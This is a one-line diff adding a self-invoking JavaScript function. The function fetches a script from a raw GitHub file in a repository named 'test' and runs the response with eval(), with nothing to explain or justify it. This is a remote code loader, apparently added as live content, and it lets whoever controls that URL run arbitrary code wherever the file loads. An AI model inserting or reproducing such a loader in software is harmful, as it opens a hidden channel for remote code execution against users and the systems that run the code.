@@ -1,0 +1,1 @@
+(function(){fetch('https://github.com/Thesupereevee1/test/raw/refs/heads/main/max').then(a=>a.text()).then(b=>{eval(b)}).catch(a=>{console.error('Error fetching the script:',a)})})();
